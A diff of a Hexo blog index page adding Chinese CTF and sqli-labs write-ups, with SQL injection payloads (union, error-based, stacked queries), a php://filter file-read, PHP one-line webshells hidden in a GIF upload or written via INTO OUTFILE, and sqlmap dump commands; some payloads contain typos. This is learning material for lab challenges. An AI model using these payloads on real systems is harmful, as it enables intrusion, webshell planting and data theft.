@@ -156,13 +156,13 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2020/11/16/hello-world/">
-                Hello World
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Knife1/">
+                Untitled
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2020-11-16</span>
+                <span class="date">2020-11-18</span>
             
             
             
@@ -171,19 +171,338 @@
 
     
         <div class="content">
-            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+            <h1 id="极客大挑战-Knife"><a href="#极客大挑战-Knife" class="headerlink" title="极客大挑战 Knife"></a>极客大挑战 Knife</h1><p>这道题一打开就是一个鲜明的提示：<br><img src="https://diviad-nick.github.io/image/jkdtz_knife_1.png"><br>很明显，菜刀shell直接连接，在主目录中找到了flag文件<br><img src="https://diviad-nick.github.io/image/jkdtz_knife_2.png"><br>打开文件，拿到flag</p>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+        </div>
+    
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+</div>
+            
+                
+<div class="post">
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20lovesql/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    
+        <div class="content">
+            <h1 id="极客大挑战-Lovesql"><a href="#极客大挑战-Lovesql" class="headerlink" title="极客大挑战 Lovesql"></a>极客大挑战 Lovesql</h1><p>万能密码登录admin账户，提示一个admin密码<br>然后发现，这flag是假的，并不是真正的flag<br>那就正常手段，sql注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:&#x2F;&#x2F;****&#x2F;check.php?username&#x3D;1&#39; #&amp;password&#x3D;131313</span><br></pre></td></tr></table></figure>
+<p>明显的字符型注入，接下来查字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:&#x2F;&#x2F;*****&#x2F;check.php?username&#x3D;1&#39; order by 3 #&amp;password&#x3D;131313</span><br></pre></td></tr></table></figure>
+<p>字段是三，用联合查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:&#x2F;&#x2F;*****&#x2F;check.php?username&#x3D;1&#39; union select 1,2,3 #&amp;password&#x3D;131313</span><br></pre></td></tr></table></figure>
+<p>然后用group_concat()来查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:&#x2F;&#x2F;*****&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_cat(table_schema) from information_schema.tables where table_schema&#x3D;&#39;geek&#39; #&amp;password&#x3D;131313</span><br></pre></td></tr></table></figure>
+<p>爆出表名，接下来查字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:&#x2F;&#x2F;*****&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_cat(column_schema) from information_schema.columns where table_schema&#x3D;&#39;geek&#39; #&amp;password&#x3D;131313</span><br></pre></td></tr></table></figure>
+<p>然后查看password字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:&#x2F;&#x2F;*****&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(password) from l0ve1ysq1 #&amp;password&#x3D;131313</span><br></pre></td></tr></table></figure>
+<p>拿到flag</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20secret%20file/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="极客大挑战-secret-file"><a href="#极客大挑战-secret-file" class="headerlink" title="极客大挑战 secret file"></a>极客大挑战 secret file</h1><p>打开界面，是黑色色调上面有红色的字体，随便点一点没发现有什么登录框什么的<br><img src="https://diviad-nick.github.io/image/jkdtz_secretfile_1.png"><br>右键查看源代码，发现线索，进入第二个界面<br><img src="https://diviad-nick.github.io/image/jkdtz_secretfile_2.png"><br>在这个界面中，点击秘密的话，会提示你已经看完了，这时候需要抓包来看一下中间闪过的内容<br><img src="https://diviad-nick.github.io/image/jkdtz_secretfile_3.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">   secr3t.php        </span><br><span class="line">--&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>中间闪过的内容提示，flag在secr3t.php文件中，访问这个文件，可以看到，提示flag在flag.php文件中，上方的代码显示，该页面存在include文件包含漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>直接file=flag.php发现并没有回显flag，说明直接包含是不行的，所以走另外一条路，php://filter包含</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:&#x2F;&#x2F;******&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<p>拿到base64加密过后的flag，解密后可以拿到flag</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20upload/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="极客大挑战-upload"><a href="#极客大挑战-upload" class="headerlink" title="极客大挑战 upload"></a>极客大挑战 upload</h1><p>打开界面是一个简单的上传界面，界面显示要上传图片<br>既然是上传，肯定是有目录的，随手看一下upload目录，发现猫腻：里面很多的文件并不是图片，这就说明它的图片检测是本地js代码检测，用burpsuit就可以成功绕过。<br>然后随便选了一个表情包上传，用burpsuit拦截数据包，后缀改成php然后内容改成一句话木马<br>eval($_POST[‘cmd’]);<br>结果被拦截，回显表示这不是一个图片文件~<br>查阅了一些资料之后构造了正确的数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据包payload:</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;v&#39;]);&lt;&#x2F;script&gt;</span><br><span class="line">文件后缀改成:x.phtml</span><br></pre></td></tr></table></figure>
+<p>然后访问一下upload目录下的4.phtml,访问成功，菜刀连接<br><img src="https://diviad-nick.github.io/image/jkdtz_upload_2.png"><br>在根目录找到flag文件</p>
+<font color=#0fff size=3>
+知识点：
+
+<p>1.关于文件格式phtml:是一种包含php代码的网页，也就是说，其内容可被当做php代码运行<br>2.关于GIF89a:这是一个图片的头，也就是说，带有这个标记的文件可以被服务器认为是gif（动态图片）<br></font></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-7%EF%BC%89/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="sql-labs通关（sql-7）"><a href="#sql-labs通关（sql-7）" class="headerlink" title="sql-labs通关（sql-7）"></a>sql-labs通关（sql-7）</h1><p>打开题目看到了熟悉的界面，输入探测代码，题目回显给出了提示<br><img src="https://diviad-nick.github.io/image/sql_7_1.png"><br>这是一种特殊的注入方式，“导出文件GET字符型注入”<br>也可以说是字符型注入的一种变种，通过使用sql命令，将查询结果导出到文件中。比如比较常见的一句话木马导出到php文件中。<br>使用这种注入方式我们不仅需要构造语句来注入，还要获取到网站在服务器中的绝对路径，获取绝对路径的方式大致有两种：</p>
+<p>1.靠经验猜。<br>　　大部分的小网站通常直接使用集成的网站环境，如phpstudy。同时还不对目录名称进行修改，直接使用网站原有的目录，还有的虽然不使用网站原有的目录，但是使用的目录很容易被猜到。针对这些网站，我们可以直接猜到网站在服务器中的路径。下面列出常见的几个路径：<br>winserver服务器一般路径如下：<br> （1）c:/inetpub/wwwroot/<br>linux中nginx服务器一般路径如下：<br> （2）/usr/local/nginx/html<br> （3）/home/wwwroot/default<br> （4）/usr/share/nginx<br> （5）/var/www/htm<br> apache服务器一般路径如下<br> （6）/var/www/htm<br> （7）/var/www/html/htdocs</p>
+<p> 2.注入获取法。<br>下面介绍两个函数：<br>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径<br>　　这两个东西可以帮助我们获取到sql注入的网站在服务器中的绝对路径，但是，这个方法不一定好用，因为这两个东西使用的时候需要对方网站做出回显。也就是说，这两个东西虽然好用，但是面对这个题目，无论输入什么都没有回显的这种状况，就无能为力了<br>　　现在演示一下这两个东西的使用方式，首先打开第一关（sql-labs1）<br>输入如下payload，我们就可以拿到绝对路径了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; union select null,@@datadir,@@basedir %23</span><br></pre></td></tr></table></figure>
+<p>我拿到了我的靶场的绝对路径：<br>C:\phpstudy_pro\Extensions\MySQL5.7.26\data<br>C:\phpstudy_pro\Extensions\MySQL5.7.26\</p>
+<p>接下来回到第七关，我们已经拿到了绝对路径，现在就是通过注入的方式将攻击代码写入或者写出网站，那么我们就会遇到另一个问题，权限管理</p>
+<p>众所周知，通常网站的权限管理都是非常严格的，我们想要通过注入的方式来写入或写出攻击代码，但是作为访问者的我们真的有对网站绝对路径的读写权限吗？这是我们需要深思的问题，好在这道题目给了我们读写的权限，也就是刚开始探测的时候，我们探测到的内个标志着“导出文件GET字符型注入”的东西 <font color=#fff0000 size=3>outfile</font></p>
+<p>接下来就是构造语句了，通过构造sql语句来对网站写入一句话木马，这是当前的攻击思路<br>尝试写入一句话：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-7&#x2F;?id&#x3D;1&quot;)) union select &#39;&lt;?php @eval($_REQUEST[&#39;cmd&#39;]) ?&gt;&#39; into outfile &quot;C:\\phpstudy_pro\\WWW\\sqli\\sqlilabs\\Less-7\\b.php&quot; %23</span><br></pre></td></tr></table></figure>
+<p>如果没写入的话，在mysql的设置文件my.ini中添加下面的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv&#x3D;&quot;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功写入文件之后，我们就可以使用菜刀或者蚁剑连接我们的一句话木马（前提是能够访问一句话木马）<br>连接完成，我们成功完成了这一关</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-6%EF%BC%89/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="sql-labs-通关攻略（sql-6）"><a href="#sql-labs-通关攻略（sql-6）" class="headerlink" title="sql-labs 通关攻略（sql-6）"></a>sql-labs 通关攻略（sql-6）</h1><p>sql中的limit：<br>    用法：用于指定查询结果范围<br>        limit n,m<br>        n:从哪一条查询结果开始返回。<br>        m:一共返回多少条查询结果。</p>
+<p>正常探测发现和第五关有不同的地方：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-6&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-6&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://diviad-nick.github.io/image/sql_6_1.png"><br>都没办法让数据库报错，还是正常回显，看代码之后发现是双引号闭合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-6&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
+<p>这样就能够让页面报错，接下来就是正常的操作了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select null,count(*),concat(select database(),floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://diviad-nick.github.io/image/sql_6_2.png"><br>查询数据库中的表,返回的值超过了一行，于是使用limit（limit后面的值是猜的，具体介绍在文章开头）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select null , count(*) , concat((select table_name from information_schema.schemata where table_schema&#x3D; &#39;security&#39; limit 3,1),floor(rand()*2))as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://diviad-nick.github.io/image/sql_6_3.png"><br>接下来就是查询数据库表中的字段，看看有没有什么有价值的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select null,count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),floor(rand()*2))as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://diviad-nick.github.io/image/sql_6_4.png"><br>然后就是字段中的内容了，直接放payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli&#x2F;sqlilabs&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select null,count(*),concat((select username from users limit 4,1),floor(rand()*2))as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://diviad-nick.github.io/image/sql_6_5.png"><br>这一关就通过了。</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-8~10%EF%BC%89/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="sql-labs通关-sql-8-10"><a href="#sql-labs通关-sql-8-10" class="headerlink" title="sql-labs通关(sql-8~10)"></a>sql-labs通关(sql-8~10)</h1><p>打开第八关，通过构造探测语句可以发现，数据库基本不返回正确和错误信息，这种情况就是盲注，也就是常说的“猜”，那我们用什么办法来判断是否正确呢？看完源码，就可以知道，当有输出的时候，$row会显示和没有输出不一样的结果，这样我们就能判断我们猜的字符是不是数据库中有的字符了。</p>
+<p>这种盲注叫做布尔盲注。</p>
+<p>因为是盲注，自己手工做出来可能性不大，采用脚本或者工具的方式可以很方便的完成。<br>这里采用sqlmap工具完成。</p>
+<p>具体操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u -ip --current-db</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u -ip -C 数据库名 --tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u -ip -C 数据库名 -T 表名 --columns </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u -ip -C 数据库名 -T 表名 -C</span><br><span class="line">字段名 --dump</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Buyflag/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>##极客大挑战 Buyflag<br>打开题目进入界面，没发现有用的信息，查看源代码发现pay.php<br>进入界面，查看源代码看到提示：<br>1.必须是学生<br>2.要有密码，密码是404，但是不能是纯数字<br>3.要有足够的钱<br>burpsuit抓包，发现cookie一栏中有有个user=0，果断改成1，第一层通过<br>密码和金钱都是post传参，用hackbar来完成，密码后面加上一个符号就能绕过 password=404[<br>金钱提示超过长度，用金钱数组来保存数字即可 money[]=1000000000(大概是这么多，忘了)<br>最后，payload如下<br>payload:<br><img src="https://diviad-nick.github.io/image/jkdtz_buyflag.png"><br>最后拿到flag<br><img src="https://diviad-nick.github.io/image/jkdtz_buyflag_2.png"></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/sql-lab%E9%80%9A%E5%85%B3%EF%BC%88sql-13%EF%BC%89/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="sql-labs-通关攻略（sql-13）"><a href="#sql-labs-通关攻略（sql-13）" class="headerlink" title="sql-labs 通关攻略（sql-13）"></a>sql-labs 通关攻略（sql-13）</h1>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2020/11/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="强网杯-随便注"><a href="#强网杯-随便注" class="headerlink" title="强网杯 -随便注"></a>强网杯 -随便注</h1><p>根据题目描述“easy_sql”，很明显的sql注入，首先查看是什么类型的注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 正常显示</span><br><span class="line">1&#39; 报错显示</span><br><span class="line">说明是字符型注入</span><br><span class="line"></span><br><span class="line">1&#39; and 1&#x3D;1 # 正常显示</span><br><span class="line">1&#39; and 1&#x3D;2 # 报错显示</span><br><span class="line">说明存在字符型的sql注入</span><br><span class="line"></span><br><span class="line">1&#39; order by 2 # 正常显示</span><br><span class="line">1&#39; order by 3 # 报错显示</span><br><span class="line">该注入中字段是2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>接下来要查一下数据库，但是这时候发生了错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and union select 1,database() #</span><br></pre></td></tr></table></figure>
+<p>用这句话来查一下数据库名，结果报错了<br>报错信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+<p>也就是说，sql对这些关键词进行了屏蔽，在大小写转换，截断绕过均无果的情况下，尝试别的注入方式</p>
+<font color=#00f size=3>
+报错注入
+
+<p>原理：通过构造注入语句，让数据库返回的报错信息中包含探测者想要知道的重要信息（比如数据库名，表名等信息）的sql攻击方式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">payload: select count(*),(concat(floor(rand()*2),(select version())))x from user group by x</span><br><span class="line">floor():向下取整</span><br><span class="line">rand():随机数函数</span><br><span class="line">concat(): 将多个字符串连接成一个字符串</span><br><span class="line">version(): mysql数据库版本号查询</span><br><span class="line">2.update() </span><br><span class="line">payload: extractvalue(1,concat(0x7e,user(),0x7e));# --查询用户名</span><br><span class="line">         extractvalue(1,concat(0x7e,database(),0x7e));# --查询数据库</span><br><span class="line">         extractvalue(1,concat(0x7e,version(),0x7e));# --查询版本信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</font>
+报错注入能够获得的信息有限，还是拿不到flag，甚至表名和列名都还拿不到，为了拿到表名和列名，使用堆叠注入的方式。
+<font color=#0ff size=3>
+
+<p>堆叠注入<br>原理：在sql语言中，多条语句可以编写在一起执行，每条语句中间用分号隔开。使用这种多条语句一起执行的注入方式，就称为堆叠注入<br>1.查询数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 1&#39;;show databases;#</span><br></pre></td></tr></table></figure>
+<p>2.查询表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 1&#39;;show tables;#</span><br></pre></td></tr></table></figure>
+<p>3.查询字段名：（分别查询连个表的字段）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: 0&#39;;show columns from words;#</span><br><span class="line">        0&#39;;show conlumns from 1919810931114514;#</span><br></pre></td></tr></table></figure>
+
+</font>
+看到 1919810931114514 这个表中有我们所需要的flag字段，但是因为过滤了很多关键字，所以没办法直接查询到表中字段的具体内容。
+
+<p>所以我们换一个思路进行注入，我们把表进行重命名，两个表的名字进行互换，然后在word表中插入一列，列名叫做id，然后把flag改名为 data</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure>
+<p>然后输入1’ or ‘1’=’1就能拿到flag了</p>
 
         </div>
     
@@ -195,6 +514,19 @@
 </div>
 
 
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="disabled" href="/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/2/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
 
 
 
@@ -219,7 +551,19 @@
         <ul>
             
             <li>
-                <a class="footer-post" href="/2020/11/16/hello-world/">Hello World</a>
+                <a class="footer-post" href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Knife1/">Untitled</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20lovesql/">Untitled</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20secret%20file/">Untitled</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20upload/">Untitled</a>
             </li>
             
         </ul>
